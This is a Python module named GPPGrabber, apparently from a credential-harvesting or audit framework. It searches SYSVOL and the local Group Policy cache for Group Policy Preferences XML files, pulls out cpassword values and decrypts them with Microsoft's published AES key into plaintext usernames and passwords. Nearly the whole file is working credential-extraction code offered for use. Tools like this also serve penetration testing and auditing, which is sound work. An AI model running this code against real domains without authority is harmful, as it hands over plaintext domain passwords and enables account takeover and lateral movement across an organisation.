"""
GPPGrabber -- Decrypt Group Policy Preferences passwords

Group Policy Preferences (GPP) allowed admins to set local admin passwords,
map drives with credentials, create scheduled tasks, etc. The passwords
were encrypted with AES-256-CBC using a key that Microsoft published in
MSDN documentation (MS14-025).

The cpassword field in XML files under SYSVOL is trivially decryptable.

Locations checked:
- C:\\Windows\\SYSVOL\\* (on domain controllers)
- Network shares: \\\\DC\\SYSVOL\\*
- Local Group Policy cache: C:\\ProgramData\\Microsoft\\Group Policy\\History\\*
- Any Groups.xml, ScheduledTasks.xml, Services.xml, DataSources.xml,
  Drives.xml, Printers.xml found during scanning

The AES key (from MS14-025):
  4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8
  f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b

MITRE ATT&CK: T1552.006 (Group Policy Preferences)
"""

from __future__ import annotations

import base64
import os
import re
import xml.etree.ElementTree as ET

from .base import GrabberContext, GrabberModule
from .models import ExtractedCredential, GrabberResult, GrabberStatus, PrivilegeLevel

# Microsoft's published AES-256-CBC key for GPP (MS14-025)
_GPP_AES_KEY = bytes([
    0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9,
    0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8,
    0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90,
    0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b,
])

# GPP XML files that can contain cpassword
_GPP_FILES = (
    "Groups.xml",
    "Services.xml",
    "ScheduledTasks.xml",
    "DataSources.xml",
    "Drives.xml",
    "Printers.xml",
)

# Directories to search for GPP files
_GPP_SEARCH_DIRS = [
    r"C:\Windows\SYSVOL",
    r"C:\ProgramData\Microsoft\Group Policy\History",
]


def decrypt_gpp_password(cpassword: str) -> str:
    """Decrypt a GPP cpassword value using Microsoft's published AES key.

    The cpassword is base64-encoded, AES-256-CBC encrypted with a null IV.
    """
    if not cpassword:
        return ""

    try:
        from ._crypto import aes_cbc_decrypt, pkcs7_unpad

        # GPP uses modified base64 (replaces some chars)
        # Pad to multiple of 4
        padded = cpassword + "=" * (4 - len(cpassword) % 4) if len(cpassword) % 4 else cpassword
        encrypted = base64.b64decode(padded)

        # AES-256-CBC with null IV
        iv = b"\x00" * 16
        decrypted = aes_cbc_decrypt(_GPP_AES_KEY, iv, encrypted)
        plaintext = pkcs7_unpad(decrypted)
        # GPP passwords are UTF-16LE encoded
        return plaintext.decode("utf-16-le", errors="ignore").rstrip("\x00")

    except Exception:
        return ""


def parse_gpp_xml(file_path: str, content: str) -> list[dict]:
    """Parse a GPP XML file and extract username + cpassword pairs."""
    results = []
    try:
        root = ET.fromstring(content)
        # Search all elements for cpassword attribute
        for elem in root.iter():
            props = elem.attrib
            cpassword = props.get("cpassword", "")
            if not cpassword:
                continue

            username = props.get("userName", "") or props.get("runAs", "") or props.get("accountName", "")
            new_name = props.get("newName", "")
            action = props.get("action", "")

            decrypted = decrypt_gpp_password(cpassword)

            results.append({
                "file": file_path,
                "username": username or new_name,
                "cpassword": cpassword,
                "decrypted": decrypted,
                "action": action,
                "element": elem.tag,
            })
    except ET.ParseError:
        pass

    return results


class GPPGrabber(GrabberModule):
    name = "gpp"
    description = "Decrypt Group Policy Preferences passwords (MS14-025)"
    min_privilege = PrivilegeLevel.USER
    supported_platforms = ("Windows", "Darwin", "Linux")
    default_enabled = True

    def preflight_check(self, context: GrabberContext) -> bool:
        # Check local GPP cache directories
        for search_dir in _GPP_SEARCH_DIRS:
            if os.path.isdir(search_dir):
                return True
        # Also check if any target paths might contain SYSVOL
        for target in context.scan_context.target_paths:
            if "sysvol" in target.lower() or "policies" in target.lower():
                return True
        return False

    def execute(self, context: GrabberContext) -> GrabberResult:
        result = GrabberResult(module_name=self.name)

        # Search standard GPP locations + scan targets
        search_dirs = list(_GPP_SEARCH_DIRS)
        for target in context.scan_context.target_paths:
            if target not in search_dirs:
                search_dirs.append(target)

        gpp_files_found = []

        for search_dir in search_dirs:
            if not os.path.isdir(search_dir):
                continue

            try:
                for root, dirs, files in os.walk(search_dir):
                    for fname in files:
                        if fname not in _GPP_FILES:
                            continue

                        fpath = os.path.join(root, fname)
                        gpp_files_found.append(fpath)

                        try:
                            with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                                content = f.read(65536)  # 64KB max
                        except OSError:
                            continue

                        entries = parse_gpp_xml(fpath, content)
                        for entry in entries:
                            result.credentials.append(ExtractedCredential(
                                source_module=self.name,
                                credential_type="password",
                                target_application="Group Policy Preferences",
                                username=entry["username"],
                                decrypted_value=entry["decrypted"],
                                encrypted_value=entry["cpassword"].encode(),
                                notes=f"action={entry['action']}; element={entry['element']}",
                                mitre_technique="T1552.006",
                                source_file=fpath,
                            ))

                            if entry["decrypted"]:
                                result.findings.append(self.make_finding(
                                    file_path=fpath,
                                    description=f"GPP password decrypted: {entry['username']}",
                                    score=200,  # CRITICAL -- plaintext domain password
                                    matched_value=f"{entry['username']}@GPP",
                                ))

            except (PermissionError, OSError) as e:
                result.errors.append(f"GPP search failed for {search_dir}: {e}")

        # Report GPP files found even without cpassword (still interesting)
        if gpp_files_found and not result.credentials:
            for fpath in gpp_files_found[:5]:
                result.findings.append(self.make_finding(
                    file_path=fpath,
                    description="GPP XML file (no cpassword found)",
                    score=40,
                    matched_value="Groups.xml",
                ))

        result.status = GrabberStatus.COMPLETED
        return result
